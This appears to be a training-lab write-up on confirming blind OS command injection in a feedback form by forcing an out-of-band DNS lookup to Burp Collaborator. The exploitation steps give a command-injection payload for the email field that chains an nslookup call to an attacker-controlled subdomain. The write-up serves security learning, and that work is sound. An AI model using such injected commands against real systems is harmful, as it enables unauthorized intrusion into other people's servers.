# Lab 04: Blind OS Command Injection with Out-of-Band Interaction

### 🎯 Objective
Confirm a blind OS command injection vulnerability by forcing the server to perform an out-of-band DNS lookup to Burp Collaborator.

### 🔍 Vulnerability Analysis
The feedback function executes a shell command asynchronously, meaning the application's response does not wait for the command to finish. There is no output reflection and no way to redirect output to a web-accessible folder. To prove execution, we must trigger an out-of-band (OOB) interaction, forcing the target server to connect to an external domain under our control.



### 🛠️ Exploitation Steps

1.  **Collaborator Setup:**
    I used the **Burp Collaborator** client to generate a unique subdomain (e.g., `unique-id.oastify.com`).

2.  **Command Injection:**
    I intercepted the feedback submission request (`POST /submit-feedback`) and targeted the `email` parameter. I used the `nslookup` command, which is designed to query DNS servers.
    
    **Payload:**
    `email=x||nslookup+YOUR-COLLABORATOR-SUBDOMAIN||`
    
    * `||`: Acts as a command separator.
    * `nslookup`: The command that triggers the DNS lookup.

3.  **Verification:**
    After sending the request, I checked the Burp Collaborator client and clicked **"Poll now"**. I received multiple DNS interactions, proving that the server successfully executed my injected command and reached out to the external domain.

### 🚩 Result
- **Evidence:** DNS lookup requests captured in Burp Collaborator logs.
- **Status:** ✅ Solved
